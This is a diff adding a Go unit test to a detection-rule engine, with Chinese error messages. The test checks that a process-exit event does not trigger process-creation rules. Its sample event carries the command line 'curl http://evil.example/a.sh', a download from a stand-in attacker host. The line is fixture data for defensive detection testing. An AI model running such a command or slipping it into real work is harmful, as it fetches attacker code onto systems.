@@ -704,4 +704,11 @@ level: medium
 	if temporal.Matches(1007, "linux", hitRaw) {
 		t.Error("跨事件时序规则 Matches 应恒返回 false")
 	}
+	exitRaw := map[string]any{
+		"activity_id": float64(2),
+		"process":     map[string]any{"cmd_line": "curl http://evil.example/a.sh"},
+	}
+	if len(eng.Evaluate(1007, "linux", exitRaw)) != 0 || r.Matches(1007, "linux", exitRaw) {
+		t.Error("进程退出事件（activity_id=2）不应触发 process_creation 规则")
+	}
 }
